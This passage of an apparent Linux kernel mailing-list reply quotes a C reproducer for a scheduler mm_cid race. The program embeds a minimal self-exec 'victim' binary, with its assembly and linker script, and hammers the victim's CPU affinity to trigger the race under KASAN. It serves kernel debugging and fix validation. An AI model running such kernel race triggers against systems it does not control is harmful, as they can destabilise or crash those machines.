> 	if (c >= 'A' && c <= 'Z')
> 		return c - 'A';
> 	if (c >= 'a' && c <= 'z')
> 		return c - 'a' + 26;
> 	if (c >= '0' && c <= '9')
> 		return c - '0' + 52;
> 	if (c == '+')
> 		return 62;
> 	if (c == '/')
> 		return 63;
> 	return -1;
> }
> 
> static int install_victim(void)
> {
> 	unsigned char out[VICTIM_SIZE];
> 	size_t i, n = 0;
> 	unsigned int acc = 0, bits = 0;
> 	int fd;
> 
> 	for (i = 0; victim_b64[i] && victim_b64[i] != '='; i++) {
> 		int v = b64_value((unsigned char)victim_b64[i]);
> 
> 		if (v < 0)
> 			continue;
> 		acc = (acc << 6) | (unsigned int)v;
> 		bits += 6;
> 		if (bits >= 8) {
> 			bits -= 8;
> 			if (n == sizeof(out)) {
> 				errno = EOVERFLOW;
> 				return -1;
> 			}
> 			out[n++] = (unsigned char)(acc >> bits);
> 			acc &= (1U << bits) - 1;
> 		}
> 	}
> 	if (n != sizeof(out)) {
> 		errno = EINVAL;
> 		return -1;
> 	}
> 	fd = syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
> 	if (fd < 0)
> 		return -1;
> 	if (fd != VICTIM_FD) {
> 		if (dup2(fd, VICTIM_FD) < 0) {
> 			close(fd);
> 			return -1;
> 		}
> 		close(fd);
> 		fd = VICTIM_FD;
> 	}
> 	if (write(fd, out, n) != (ssize_t)n || fchmod(fd, 0700))
> 		return -1;
> 	return 0;
> }
> 
> static int install_exec_counter(void)
> {
> 	int fd = eventfd(0, EFD_NONBLOCK);
> 
> 	if (fd < 0)
> 		return -1;
> 	if (fd != READY_FD) {
> 		if (dup2(fd, READY_FD) < 0) {
> 			close(fd);
> 			return -1;
> 		}
> 		close(fd);
> 	}
> 	return 0;
> }
> 
> static void pin_self(int cpu)
> {
> 	cpu_set_t mask;
> 
> 	CPU_ZERO(&mask);
> 	CPU_SET(cpu, &mask);
> 	if (sched_setaffinity(0, sizeof(mask), &mask)) {
> 		fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
> 		_exit(2);
> 	}
> }
> 
> static void alarm_handler(int sig)
> {
> 	(void)sig;
> }
> 
> static void enable_irq_pressure(void)
> {
> 	struct sigaction sa = { .sa_handler = alarm_handler };
> 	struct itimerval timer = {
> 		.it_interval = { .tv_sec = 0, .tv_usec = 31 },
> 		.it_value = { .tv_sec = 0, .tv_usec = 31 },
> 	};
> 
> 	sigemptyset(&sa.sa_mask);
> 	sa.sa_flags = SA_RESTART;
> 	if (sigaction(SIGALRM, &sa, NULL) ||
> 	    setitimer(ITIMER_REAL, &timer, NULL))
> 		_exit(3);
> }
> 
> static int drain_exec_counter(unsigned long long *total)
> {
> 	uint64_t value;
> 
> 	for (;;) {
> 		ssize_t ret = read(READY_FD, &value, sizeof(value));
> 
> 		if (ret == sizeof(value)) {
> 			*total += value;
> 			continue;
> 		}
> 		if (ret < 0 && errno == EINTR)
> 			continue;
> 		if (ret < 0 && errno == EAGAIN)
> 			return 0;
> 		return -1;
> 	}
> }
> 
> static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
> {
> 	struct pollfd pfd = { .fd = READY_FD, .events = POLLIN };
> 	int status, ret;
> 
> 	do {
> 		ret = poll(&pfd, 1, 5000);
> 	} while (ret < 0 && errno == EINTR);
> 	if (ret != 1 || !(pfd.revents & POLLIN) ||
> 	    drain_exec_counter(execs) || !*execs)
> 		return -1;
> 	ret = waitpid(victim, &status, WNOHANG);
> 	if (ret == victim) {
> 		errno = ECHILD;
> 		return -1;
> 	}
> 	return ret < 0 ? -1 : 0;
> }
> 
> static void publish_stats(struct setter_stats *stats,
> 			  unsigned long long attempts,
> 			  unsigned long long successes,
> 			  unsigned long long errors)
> {
> 	__atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
> 	__atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
> 	__atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
> }
> 
> static void run_setter(pid_t victim, int cpu, int victim_a, int victim_b,
> 		       int index, time_t deadline, struct shared_state *state)
> {
> 	cpu_set_t one, two;
> 	unsigned long long attempts = 0, successes = 0, errors = 0;
> 
> 	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
> 	pin_self(cpu);
> 	enable_irq_pressure();
> 	CPU_ZERO(&one);
> 	CPU_SET(victim_a, &one);
> 	CPU_ZERO(&two);
> 	CPU_SET(victim_a, &two);
> 	CPU_SET(victim_b, &two);
> 	while (time(NULL) < deadline) {
> 		if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), &one))
> 			successes++;
> 		else
> 			errors++;
> 		attempts++;
> 		if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), &two))
> 			successes++;
> 		else
> 			errors++;
> 		attempts++;
> 		if (!(attempts & 0x3ff))
> 			publish_stats(&state->setters[index], attempts,
> 				      successes, errors);
> 	}
> 	publish_stats(&state->setters[index], attempts, successes, errors);
> 	_exit(0);
> }
> 
> static void load_totals(struct shared_state *state, int nset,
> 			unsigned long long *attempts,
> 			unsigned long long *successes,
> 			unsigned long long *errors)
> {
> 	int i;
> 
> 	*attempts = *successes = *errors = 0;
> 	for (i = 0; i < nset; i++) {
> 		*attempts += __atomic_load_n(&state->setters[i].attempts,
> 					     __ATOMIC_RELAXED);
> 		*successes += __atomic_load_n(&state->setters[i].successes,
> 					      __ATOMIC_RELAXED);
> 		*errors += __atomic_load_n(&state->setters[i].errors,
> 					   __ATOMIC_RELAXED);
> 	}
> }
> 
> static int wait_child(pid_t pid, int *status)
> {
> 	pid_t ret;
> 
> 	do {
> 		ret = waitpid(pid, status, 0);
> 	} while (ret < 0 && errno == EINTR);
> 	return ret == pid ? 0 : -1;
> }
> 
> int main(int argc, char **argv)
> {
> 	struct shared_state *state;
> 	pid_t victim, setters[MAX_SETTERS];
> 	time_t deadline;
> 	unsigned long long attempts = 0, successes = 0, errors = 0;
> 	unsigned long long execs = 0, previous_execs, previous_successes = 0;
> 	int cpus, runtime, victim_a, victim_b, nset, i, status;
> 	int spawned = 0, failed = 0;
> 
> 	setvbuf(stdout, NULL, _IONBF, 0);
> 	setvbuf(stderr, NULL, _IONBF, 0);
> 	cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
> 	if (cpus < 4) {
> 		fprintf(stderr, "need at least four online CPUs\n");
> 		return 1;
> 	}
> 	runtime = argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
> 	if (runtime <= 0)
> 		runtime = DEFAULT_RUNTIME;
> 	victim_a = cpus - 2;
> 	victim_b = cpus - 1;
> 	nset = victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
> 	state = mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
> 		     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
> 	if (state == MAP_FAILED)
> 		return 1;
> 	for (i = 0; i < MAX_SETTERS; i++)
> 		setters[i] = -1;
> 	if (install_exec_counter() || install_victim()) {
> 		perror("install victim");
> 		return 1;
> 	}
> 
> 	victim = fork();
> 	if (!victim) {
> 		cpu_set_t pinned;
> 		char *const av[] = { "victim", NULL };
> 		char *const ev[] = { NULL };
> 
> 		prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
> 		CPU_ZERO(&pinned);
> 		CPU_SET(victim_a, &pinned);
> 		if (sched_setaffinity(0, sizeof(pinned), &pinned))
> 			_exit(4);
> 		syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PATH);
> 		_exit(127);
> 	}
> 	if (victim < 0)
> 		return 1;
> 	if (wait_for_first_exec(victim, &execs)) {
> 		perror("victim did not begin exec loop");
> 		failed = 1;
> 		goto cleanup;
> 	}
> 	deadline = time(NULL) + runtime;
> 	printf("[*] standalone minimal-exec race: runtime=%ds setters=%d\n",
> 	       runtime, nset);
> 	printf("[*] victim starts on cpu%d; setters alternate {%d} and {%d,%d}\n",
> 	       victim_a, victim_a, victim_a, victim_b);
> 	for (i = 0; i < nset; i++) {
> 		setters[i] = fork();
> 		if (!setters[i])
> 			run_setter(victim, i, victim_a, victim_b, i,
> 				   deadline, state);
> 		if (setters[i] < 0) {
> 			perror("fork setter");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		spawned++;
> 	}
> 	previous_execs = execs;
> 	while (time(NULL) < deadline) {
> 		struct timespec delay;
> 		time_t remaining = deadline - time(NULL);
> 		pid_t ret;
> 
> 		ret = waitpid(victim, &status, WNOHANG);
> 		if (ret == victim) {
> 			fprintf(stderr, "victim exited early: status=0x%x\n", status);
> 			victim = -1;
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		if (ret < 0) {
> 			perror("waitpid victim");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		for (i = 0; i < spawned; i++) {
> 			if (setters[i] < 0)
> 				continue;
> 			ret = waitpid(setters[i], &status, WNOHANG);
> 			if (ret == setters[i]) {
> 				setters[i] = -1;
> 				if (time(NULL) < deadline || !WIFEXITED(status) ||
> 				    WEXITSTATUS(status)) {
> 					fprintf(stderr,
> 						"setter %d exited early: status=0x%x\n",
> 						i, status);
> 					failed = 1;
> 					goto cleanup;
> 				}
> 			} else if (ret < 0) {
> 				perror("waitpid setter");
> 				failed = 1;
> 				goto cleanup;
> 			}
> 		}
> 		if (remaining <= 0)
> 			break;
> 		delay.tv_sec = remaining > 10 ? 10 : remaining;
> 		delay.tv_nsec = 0;
> 		while (nanosleep(&delay, &delay) && errno == EINTR)
> 			;
> 		if (drain_exec_counter(&execs)) {
> 			perror("read exec counter");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		ret = waitpid(victim, &status, WNOHANG);
> 		if (ret == victim) {
> 			fprintf(stderr, "victim exited early: status=0x%x\n", status);
> 			victim = -1;
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		if (ret < 0) {
> 			perror("waitpid victim");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		load_totals(state, nset, &attempts, &successes, &errors);
> 		if (execs == previous_execs) {
> 			fprintf(stderr, "victim made no exec progress in window\n");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		if (successes == previous_successes) {
> 			fprintf(stderr,
> 				"setters made no successful affinity progress in window\n");
> 			failed = 1;
> 			goto cleanup;
> 		}
> 		printf("[*] progress: affinity_success=%llu attempts=%llu "
> 		       "errors=%llu execs=%llu\n",
> 		       successes, attempts, errors, execs);
> 		previous_execs = execs;
> 		previous_successes = successes;
> 	}
> 	for (i = 0; i < spawned; i++) {
> 		if (setters[i] < 0)
> 			continue;
> 		if (wait_child(setters[i], &status) || !WIFEXITED(status) ||
> 		    WEXITSTATUS(status)) {
> 			fprintf(stderr, "setter %d failed: status=0x%x\n", i, status);
> 			failed = 1;
> 		}
> 		setters[i] = -1;
> 	}
> 	load_totals(state, nset, &attempts, &successes, &errors);
> 	if (!attempts || !successes || attempts != successes + errors) {
> 		fprintf(stderr, "invalid affinity totals\n");
> 		failed = 1;
> 	}
> 	if (drain_exec_counter(&execs)) {
> 		fprintf(stderr, "failed to read final exec progress\n");
> 		failed = 1;
> 	}
> 	if (kill(victim, SIGKILL)) {
> 		perror("kill victim");
> 		failed = 1;
> 	} else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
> 		   WTERMSIG(status) != SIGKILL) {
> 		fprintf(stderr, "unexpected victim status: 0x%x\n", status);
> 		failed = 1;
> 	}
> 	victim = -1;
> 	if (!failed) {
> 		printf("[*] validated completion: affinity_success=%llu "
> 		       "attempts=%llu errors=%llu execs=%llu; no KASAN report\n",
> 		       successes, attempts, errors, execs);
> 		return 0;
> 	}
> 
> cleanup:
> 	for (i = 0; i < spawned; i++) {
> 		if (setters[i] > 0) {
> 			kill(setters[i], SIGKILL);
> 			wait_child(setters[i], &status);
> 		}
> 	}
> 	if (victim > 0) {
> 		kill(victim, SIGKILL);
> 		wait_child(victim, &status);
> 	}
> 	puts("[!] validation failed");
> 	return 1;
> }
> ```
> 
> The embedded victim source and linker script follow.
> 
> `victim_min_execfd.S`:
> 
> ```asm
> 	.section .text
> 	.global _start
> 	.type _start,@function
> _start:
> 	mov %rsp, %r12
> 
> 	/* Count this instance through the inherited eventfd. */
> 	mov $1, %eax
> 	mov $3, %edi
> 	lea one(%rip), %rsi
> 	mov $8, %edx
> 	syscall
> 	cmp $8, %rax
> 	jne .Lexit
> 
> 	/* Drop the stack and adjacent vDSO/vvar mappings before exec. */
> 	mov %r12, %rdi
> 	and $-2097152, %rdi
> 	mov $4194304, %esi
> 	mov $11, %eax
> 	syscall
> 
> 	/* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
> 	mov $322, %eax
> 	mov $4, %edi
> 	lea empty(%rip), %rsi
> 	lea argv(%rip), %rdx
> 	xor %r10d, %r10d
> 	mov $0x1000, %r8d
> 	syscall
> 
> .Lexit:
> 	mov $60, %eax
> 	mov $127, %edi
> 	syscall
> 	hlt
> 	.size _start, .-_start
> 
> 	.section .data
> 	.align 8
> one:
> 	.quad 1
> empty:
> 	.byte 0
> 	.align 8
> argv:
> 	.quad empty
> 	.quad 0
> 
> 	.section .note.GNU-stack,"",@progbits
> ```
> 
> `victim_min.ld`:
> 
> ```ld
> ENTRY(_start)
> 
> PHDRS
> {
> 	image PT_LOAD FILEHDR PHDRS FLAGS(7);
> 	stack PT_GNU_STACK FLAGS(6);
> }
> 
> SECTIONS
> {
> 	. = 0x400000 + SIZEOF_HEADERS;
> 	.image : ALIGN(16) {
> 		*(.text*)
> 		*(.rodata*)
> 		*(.data*)
> 		*(.bss*)
> 	} :image
> 	/DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
> }
> ```
> 
> The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:
> 
> ```sh
> gcc -c -nostdlib -o victim.o victim_min_execfd.S
> ld -nostdlib -T victim_min.ld -o victim victim.o
> test "$(stat -c %s victim)" = 848
> readelf -h -l -S victim
> base64 -w 76 victim
> ```
> 
> 
> Thanks,
> Weiming
> 


-- 
Mathieu Desnoyers
EfficiOS Inc.
https://www.efficios.com

